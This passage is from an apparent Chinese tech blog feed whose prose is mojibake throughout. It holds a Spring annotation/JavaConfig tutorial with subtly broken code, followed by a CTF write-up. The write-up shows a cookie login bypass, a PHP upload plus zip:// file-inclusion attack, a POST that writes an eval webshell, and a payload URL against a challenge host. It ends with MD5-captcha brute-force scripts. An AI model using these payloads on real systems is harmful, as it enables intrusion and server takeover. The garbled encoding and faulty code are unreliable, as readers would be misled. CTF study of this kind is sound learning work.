<p>è¿™å››ä¸ªç±»çš„æœ¬è´¨éƒ½æ²¡æœ‰åŒºåˆ«ï¼Œéƒ½ä»£è¡¨æ³¨å†Œä¸€ä¸ªbeanå»XMLå½“ä¸­ï¼Œåªä¸è¿‡è¿™æ ·å†™å¯ä»¥ä½¿å¾—æˆ‘ä»¬MVCæ¶æ„æ›´åŠ æ¸…æ™°æ˜äº†</p>
</li>
<li><p>è‡ªåŠ¨è£…é…</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- <span class="meta">@Atuowired</span>: è‡ªåŠ¨è£…é…</span><br><span class="line">- <span class="meta">@Nullable</span>ï¼š å…è®¸å­—æ®µä¸º<span class="keyword">null</span></span><br><span class="line">- <span class="meta">@Resource</span>  ï¼šé€šè¿‡åå­—ï¼Œç±»å‹è‡ªåŠ¨è£…é…</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½œç”¨åŸŸ</p>
<p>å…¶å®é€šè¿‡æ³¨è§£ä¹Ÿå¯ä»¥å¯¹ä½œç”¨åŸŸè¿›è¡Œæ³¨è§£ï¼Œä½†æ˜¯æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Scope()</span></span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆä¸é€šè¿‡XMLå‘¢ï¼Ÿ</p>
</li>
<li><p>å°ç»“</p>
</li>
</ol>
<p>åœ¨è¿™ç« æˆ‘ä»¬å­¦ä¼šäº†åˆ©ç”¨æ³¨è§£è¿›è¡Œå¼€å‘ï¼Œå¯ä»¥é€šè¿‡æ³¨è§£æ‘†è„±XMLï¼Œä½†æ˜¯æˆ‘é€šè¿‡å­¦ä¹ è¿™ä¸€ç« èŠ‚ï¼Œæˆ‘æ„Ÿè§‰Springæ­¤æ—¶è¿˜æ˜¯ä¸å¤Ÿæˆç†Ÿï¼Œå¤§éƒ¨åˆ†çš„æ—¶å€™è¿˜æ˜¯åˆ©ç”¨XMLæ›´åŠ æ–¹ä¾¿ï¼Œå¤æ‚çš„ä¸œè¥¿ä¸¢ç»™XMLæ¥åšï¼Œç®€å•çš„åˆ©ç”¨æ³¨è§£æ³¨å…¥å°±è¡Œ</p>
<p>æ‰€ä»¥æœ€ä½³å®è·µåº”è¯¥æ˜¯ï¼š</p>
<ul>
<li>åˆ©ç”¨XMLæ‰‹åŠ¨çš„å»ºç«‹æ¯ä¸ªbeanï¼Œè¿™æ ·æ–¹ä¾¿ç¨‹åºå‘˜çš„äº’ç›¸åˆä½œ</li>
<li>XMLæ³¨å…¥MAPç±»å‹ç­‰</li>
<li>åˆ©ç”¨æ³¨é‡Šæ‰‹åŠ¨çš„æ³¨å…¥ç®€å•å€¼ï¼Œé™ä½å¼€å‘æˆæœ¬</li>
</ul>
<p>åŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦äº†è§£ï¼š</p>
<ul>
<li>XMLçš„ä¼˜åŠ¿å°±åœ¨äºä»–æ›´åŠ æ¸…æ¥šæ˜äº†ï¼Œèµ·ç åœ¨Springæ¥è¯´æ˜¯è¿™æ ·çš„ï¼ŒåŒæ—¶XMLè¿˜æ–¹ä¾¿è·¨æ–‡ä»¶é…åˆ</li>
<li>è€Œæ³¨è§£æ›´åŠ çš„æ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå¼€å‘ï¼Œæ³¨å…¥å€¼ï¼Œé™ä½ç¨‹åºå‘˜çš„æˆæœ¬ï¼ˆä½†æ˜¯å¢åŠ äº†è¿ç»´çš„éš¾åº¦</li>
</ul>
<p>ä½¿ç”¨æ³¨è§£å¼€å‘çš„ä¸€ä¸ªç®€å•ä¾‹å­ï¼Œè¿˜æ˜¯ä¸€ä¸ªäººä¸¤ä¸ªå® ç‰©ï¼š</p>
<p>ğŸ±çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ğŸ±ï¼šwdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ğŸ•çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line">org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ğŸ•ï¼šwdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>äººçš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;æœˆçŸ³&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">        user.getCat().shout();</span><br><span class="line">        user.getDog().shout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾ç„¶èƒ½å¤Ÿæ­£å¸¸çš„å¾—åˆ°ç»“æœ~</p>
<h1 id="8-å®Œå…¨ä½¿ç”¨Javaé…ç½®Spring"><a href="#8-å®Œå…¨ä½¿ç”¨Javaé…ç½®Spring" class="headerlink" title="8 å®Œå…¨ä½¿ç”¨Javaé…ç½®Spring"></a>8 å®Œå…¨ä½¿ç”¨Javaé…ç½®Spring</h1><p>æˆ‘ä»¬ç°åœ¨è¦å®Œå…¨ä½¿ç”¨Javaconfigå®Œå…¨çš„ä»£æ›¿XMLäº†ï¼ŒSpringBootå½“ä¸­ä¹Ÿæ˜¯è¿™æ ·åšçš„ï¼Œæˆ‘è¿˜æ˜¯æœ‰ç‚¹æ…Œï¼Œæ„Ÿè§‰æ²¡æœ‰èƒ½å¤Ÿé€‚åº”è¿‡æ¥</p>
<p>è¿˜æ˜¯å¾ˆæœ‰å¿…è¦å°†XMLçš„æ–¹å¼å’ŒJavaç±»çš„æ–¹å¼è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿ç”¨Javaconfigæ¥ä»£æ›¿XML</p>
<p>æ„é€ å¦‚ä¸‹Javaä»£ç :</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Component(&quot;com.ys.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(JavaConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä½¿ç”¨@Configurationçš„æ„æ€ç­‰åŒäºï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> &gt;</span><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬æ‰€æœ‰çš„é…ç½®éƒ½å¯ä»¥å†™åœ¨è¯¥ç±»å½“ä¸­</p>
<p>@Component(â€œcom.ys.pojoâ€)ç±»ç­‰åŒäºå¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ys&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†ä¸¤è€…ä¹‹é—´è¿›è¡Œè¿›ä¸€æ­¥çš„å¯¹æ¯”ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é…ç½®ä¸€ä¸ªç±»çš„è¯ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªXMLæ ‡ç­¾ç­‰åŒäºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£å¦‚ä½•æ³¨å…¥å€¼å‘¢ï¼Ÿ</p>
<p>åœ¨XMLå½“ä¸­æˆ‘ä»¬æ˜¯è¿™æ ·æ“ä½œçš„ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€Œåˆ°äº†Javaconfigä¹‹ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;æœˆçŸ³&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬é€‰æ‹©ç›´æ¥ç”±ç±»æ¥æ³¨å…¥å€¼ï¼</p>
<p>è€ŒAutowiredä¾ç„¶æ²¡æœ‰å˜åŒ–ï¼Œè¿˜æ˜¯ç›´æ¥åœ¨åŒ…ä¸­å¯»æ‰¾ä¸Šä¸‹æ–‡çš„ç±»~ï¼Œæ¯”å¦‚æˆ‘ä»¬å°è¯•ç»§ç»­å­¦ä¹ ä¸¾ä¾‹ï¼Œä¸€ä¸ªäººæœ‰ä¸€åªçŒ«å’Œä¸€ä¸ªç‹—:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ğŸ±è¯´ï¼šwdnmdb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ğŸ•è¯´ï¼šwndmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ä½¿ç”¨è¿™ç§æ–¹å¼æ¥åˆ›å»ºä¹‹åï¼Œå°±æ²¡æœ‰åœ°æ–¹æ¥ä½¿ç”¨@Componentè¿™ä¸ªæ³¨è§£äº†ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰XMLå‘¢ï¼Ÿ</p>
<p>æ€»è€Œè¨€ä¹‹æˆ‘å¿…é¡»ä¸åšå‡ºè¿™æ ·çš„JavaConfigä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Component(&quot;com.ys.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(JavaConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">cat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">dog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œæˆ‘ä»¬çš„@Componentå°±æ²¡æœ‰ä»€ä¹ˆç”¨æ­¦ä¹‹åœ°äº†..</p>
]]></content>
      <tags>
        <tag>å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>2020æå®¢å¤§æŒ‘æˆ˜</title>
    <url>/2021/04/27/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
    <content><![CDATA[<h2 id="Roamphp2-Myblog"><a href="#Roamphp2-Myblog" class="headerlink" title="Roamphp2-Myblog"></a>Roamphp2-Myblog</h2><p>å…ˆæ˜¯ä¼ªåè®®åˆ°å¤„è¯»æ–‡ä»¶..</p>
<p>åˆ†åˆ«èƒ½è¯»åˆ°home.php,login.php,secret.phpï¼Œç„¶ååœ¨login.phpä¸‹çœ‹htmlèƒ½è¯»åˆ°/admin/user.php</p>
<p>æ„Ÿè§‰åƒæ˜¯ä¼ªéšæœºæ•°çˆ†ç ´..</p>
<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427135216661.png" alt="image-20210427135216661"></p>
<p>å®¡è®¡ä»£ç åå‘ç°å…¶å®æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå› ä¸ºåˆ¤æ–­ä¸­å¯¹$_SESSIONpasswordè¿›è¡Œäº†å¯¹æ¯”ï¼Œå¦‚æœæƒ³è¦ç»•è¿‡çš„è¯å°†ä¸¤è€…éƒ½æ˜¯ä½œä¸ºç©ºå³å¯</p>
<p>æ•…æˆ‘ä»¬ç›´æ¥æ„é€ payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cookies:</span><br><span class="line"></span><br><span class="line">username&#x3D;Longlone&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<p>ç™»é™†ä¸Šä¹‹åå°±å¯ä»¥æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œç»™å‡ºäº†æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> $_SESSION[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">           $tmp_file = $_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">           $tmp_path = $_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">           <span class="keyword">if</span>(($extension = pathinfo($tmp_file)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">               $allows = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line">               <span class="keyword">if</span>(in_array($extension,$allows,<span class="literal">true</span>) <span class="keyword">and</span> in_array($_FILES[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params">$ext</span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.$ext;&#125;,$allows),<span class="literal">true</span>))&#123;</span><br><span class="line">                   $upload_name = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.$extension;</span><br><span class="line">                   move_uploaded_file($tmp_path,<span class="string">&quot;assets/img/upload/&quot;</span>.$upload_name);</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ä¹‹åæˆ‘ä»¬å†å»index.phpåŒ…å«ä¸å°±å¥½äº†å—ï¼ã€‚æƒ³åˆ°è¿™é‡Œæˆ‘ä»¬é©¬ä¸Šæ“ä½œ.ç»“æœçªç„¶æƒ³åˆ°åœ¨æ–‡ä»¶çš„æœ€åä¼šè¢«åŠ ä¸Šphpåç¼€å,è¿™å°±æ²¡åŠæ³•ç›´æ¥è¯»å–äº†,åªèƒ½é€šè¿‡zipåè®®</p>
<p>ä¼ªåè®®: file://ã€php://filterã€php://inputã€zip://ã€compress.bzip2://ã€compress.zlib://ã€data://</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;148886.html</span><br></pre></td></tr></table></figure>

<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427143558838.png" alt="image-20210427143558838"></p>
<p>é¢˜å¤–è¯:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=php://input</span><br><span class="line"></span><br><span class="line">[POST DATA] &lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥POSTå¦‚ä¸‹å†…å®¹ç”Ÿæˆä¸€å¥è¯ï¼š &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆè¿™æ ·å°±ç®€å•äº†ï¼Œå†™ä¸€ä¸ªshell.phpï¼Œç„¶åå‹ç¼©ï¼Œå†æ”¹åç¼€ä¸ºjpgå³å¯,</p>
<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427144441817.png" alt="image-20210427144441817"></p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0dad2d9e-f7fb-4cb0-905a-9860648d77ec.node3.buuoj.cn&#x2F;?page&#x3D;zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;assets&#x2F;img&#x2F;upload&#x2F;d03ea7c190280b2369947674c89fb32c6e98f591.jpg%23shell</span><br></pre></td></tr></table></figure>

<h2 id="Roamphp4-Rceme"><a href="#Roamphp4-Rceme" class="headerlink" title="Roamphp4-Rceme"></a>Roamphp4-Rceme</h2><p>æ–‡ä»¶æ³„éœ²..<br>swpçš„æ–‡ä»¶æ³„éœ²æ˜¯é€šè¿‡ .filename.swpçš„ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">.index.php.swp</span><br></pre></td></tr></table></figure>

<p>è„±ä¸‹æ¥ä¹‹åå¾—åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 	author : Longlone</span></span><br><span class="line"><span class="comment">* 	 type  : Backup</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**********************************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(substr(md5($_POST[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== $_SESSION[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    $code = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>codeæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´æ¥å¾—åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(md5($a), <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;f815a&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>($a.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $a++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…­ä½æ•°ä»¥ä¸‹éƒ½å¯ä»¥çˆ†ç ´..è¶…è¿‡å…­ä½æ•°çš„è¯ä¼šå¾ˆéš¾å‡º</p>
<p>è¿™é‡Œå†è´´ä¸Šä¸€ä¸ªåˆ«çš„å¸ˆå‚…çš„pythonçš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5æˆªæ–­æ•°å€¼å·²çŸ¥ æ±‚åŸå§‹æ•°æ®</span></span><br><span class="line"><span class="comment"># ä¾‹å­ substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>    <span class="comment"># è®¡ç®—MD5å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;2e2f0&#x27;</span>    <span class="comment"># å·²çŸ¥çš„md5æˆªæ–­å€¼</span></span><br><span class="line">md5start = <span class="number">0</span>    <span class="comment"># è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½®</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯•</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])    <span class="comment"># å¼€å§‹ä½ç½®</span></span><br><span class="line">    end = <span 